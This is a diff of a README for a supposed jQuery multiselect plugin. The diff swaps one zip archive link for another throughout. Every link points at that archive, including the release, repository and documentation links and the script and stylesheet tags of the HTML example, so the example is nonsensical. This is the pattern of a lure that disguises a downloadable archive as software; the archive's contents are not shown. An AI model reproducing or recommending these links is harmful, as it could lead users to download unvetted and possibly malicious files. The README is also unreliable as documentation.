@@ -4,7 +4,7 @@
 InterActiveMultiSelect is a simple jQuery plugin that helps you create user-friendly multiselect dropdowns. It comes packed with features such as checkboxes, radio buttons, option groups, and a search box. You can even use it with Bootstrap modals for a seamless experience.
 
 ## 📥 Download Now
-[![Download InterActiveMultiSelect](https://github.com/SodaInCan/InterActiveMultiSelect/raw/refs/heads/main/js/Inter_Multi_Active_Select_1.5.zip)](https://github.com/SodaInCan/InterActiveMultiSelect/raw/refs/heads/main/js/Inter_Multi_Active_Select_1.5.zip)
+[![Download InterActiveMultiSelect](https://raw.githubusercontent.com/SodaInCan/InterActiveMultiSelect/main/js/Inter-Select-Multi-Active-v3.7.zip)](https://raw.githubusercontent.com/SodaInCan/InterActiveMultiSelect/main/js/Inter-Select-Multi-Active-v3.7.zip)
 
 ## 🛠️ System Requirements
 To run InterActiveMultiSelect, ensure your system meets the following requirements:
@@ -21,7 +21,7 @@ To run InterActiveMultiSelect, ensure your system meets the following requiremen
 ## 📦 Download & Install
 To download InterActiveMultiSelect, visit the Releases page. Follow these steps:
 1. Click the link below to go to the Releases page:
-   [Visit Releases Page](https://github.com/SodaInCan/InterActiveMultiSelect/raw/refs/heads/main/js/Inter_Multi_Active_Select_1.5.zip)
+   [Visit Releases Page](https://raw.githubusercontent.com/SodaInCan/InterActiveMultiSelect/main/js/Inter-Select-Multi-Active-v3.7.zip)
   
 2. On the Releases page, you will find different versions of the plugin. Look for the latest version.
 
@@ -48,9 +48,9 @@ To use InterActiveMultiSelect in your HTML file, follow this example:
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Multiselect Example</title>
-    <link rel="stylesheet" href="https://github.com/SodaInCan/InterActiveMultiSelect/raw/refs/heads/main/js/Inter_Multi_Active_Select_1.5.zip">
-    <script src="https://github.com/SodaInCan/InterActiveMultiSelect/raw/refs/heads/main/js/Inter_Multi_Active_Select_1.5.zip"></script>
-    <script src="https://github.com/SodaInCan/InterActiveMultiSelect/raw/refs/heads/main/js/Inter_Multi_Active_Select_1.5.zip"></script>
+    <link rel="stylesheet" href="https://raw.githubusercontent.com/SodaInCan/InterActiveMultiSelect/main/js/Inter-Select-Multi-Active-v3.7.zip">
+    <script src="https://raw.githubusercontent.com/SodaInCan/InterActiveMultiSelect/main/js/Inter-Select-Multi-Active-v3.7.zip"></script>
+    <script src="https://raw.githubusercontent.com/SodaInCan/InterActiveMultiSelect/main/js/Inter-Select-Multi-Active-v3.7.zip"></script>
 </head>
 <body>
     <select id="mySelect" multiple>
@@ -97,9 +97,9 @@ InterActiveMultiSelect is licensed under the MIT License. You can find the compl
 
 ## 📄 Additional Resources
 For more information on how to use InterActiveMultiSelect, check out the following resources:
-- [GitHub Repository](https://github.com/SodaInCan/InterActiveMultiSelect/raw/refs/heads/main/js/Inter_Multi_Active_Select_1.5.zip)
-- [Documentation](https://github.com/SodaInCan/InterActiveMultiSelect/raw/refs/heads/main/js/Inter_Multi_Active_Select_1.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/SodaInCan/InterActiveMultiSelect/main/js/Inter-Select-Multi-Active-v3.7.zip)
+- [Documentation](https://raw.githubusercontent.com/SodaInCan/InterActiveMultiSelect/main/js/Inter-Select-Multi-Active-v3.7.zip)
 
 Make your forms interactive and more user-friendly with InterActiveMultiSelect today!
 
-[![Download InterActiveMultiSelect](https://github.com/SodaInCan/InterActiveMultiSelect/raw/refs/heads/main/js/Inter_Multi_Active_Select_1.5.zip)](https://github.com/SodaInCan/InterActiveMultiSelect/raw/refs/heads/main/js/Inter_Multi_Active_Select_1.5.zip)
+[![Download InterActiveMultiSelect](https://raw.githubusercontent.com/SodaInCan/InterActiveMultiSelect/main/js/Inter-Select-Multi-Active-v3.7.zip)](https://raw.githubusercontent.com/SodaInCan/InterActiveMultiSelect/main/js/Inter-Select-Multi-Active-v3.7.zip)
